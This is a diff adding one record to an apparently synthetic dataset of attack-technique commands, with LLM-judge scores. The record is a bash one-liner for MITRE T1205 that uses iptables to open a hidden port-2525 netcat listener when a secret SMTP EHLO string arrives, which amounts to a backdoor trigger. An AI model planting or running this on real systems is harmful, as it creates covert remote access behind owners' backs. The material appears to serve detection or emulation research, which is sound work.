@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "iptables -I INPUT -m recent --name t1205_smtp --rcheck --seconds 60 -p tcp --dport 2525 -j ACCEPT; iptables -I INPUT -p tcp --dport 25 -m string --string \"EHLO T1205\" --algo bm -m recent --name t1205_smtp --set -j LOG --log-prefix \"T1205-SMTP-SIGNAL \"; nc -l -p 2525 -k >/dev/null 2>&1 &",
+  "explanation": "Uses a crafted SMTP EHLO token on TCP/25 as the signaling packet. On match, logs and whitelists the source for 60s to reach TCP/2525, where nc listens. Emulates SMTP-layer signaling for conditional access.",
+  "rationale_steps": [
+    "Match SMTP client greeting for a hidden token",
+    "Log irregular SMTP commands to system logs",
+    "Enable a gated port only after the magic EHLO"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-19973fec-946e4953",
+  "source_prompt_hash": "19973fec",
+  "timestamp_utc": "2025-09-30T03:30:48.198488Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Commands are well-formed with balanced quoting, proper separators, and valid iptables/nc flags on common Linux implementations.",
+        "semantic_score": 4,
+        "semantic_justification": "It uses an SMTP EHLO string to signal and set a recent list to temporarily permit port 2525 and log the event, aligning with T1205, but it requires root privileges and relies on existing firewall policy for the gating to be effective.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T18:36:02.444494Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command chain is well-formed with proper semicolons, balanced quotes, and valid iptables/nc flags, though the privilege annotation of 'None' is inconsistent since iptables requires root, which could cause runtime failure rather than a syntax error.",
+        "semantic_score": 4,
+        "semantic_justification": "The implementation correctly emulates T1205 port-knocking/traffic-signaling via a crafted SMTP EHLO string to conditionally whitelist a source IP for 60 seconds to access a backdoor listener on port 2525, which is operationally plausible, though nc with -k listening and discarding all output to /dev/null limits its practical C2 utility and the privilege annotation is incorrect since iptables requires root.",
+        "combined_score": 4.0,
+        "confidence": 0.85,
+        "timestamp": "2026-02-19T04:06:11.538177Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses perfectly well-formed iptables syntax, correct Netcat flags, and valid shell operators including command separators and background execution.",
+        "semantic_score": 4,
+        "semantic_justification": "The logic perfectly implements traffic signaling by using the iptables 'recent' module to trigger access based on payload content, though the metadata incorrectly specifies 'Privilege: None' for a command requiring root.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T04:06:19.499985Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
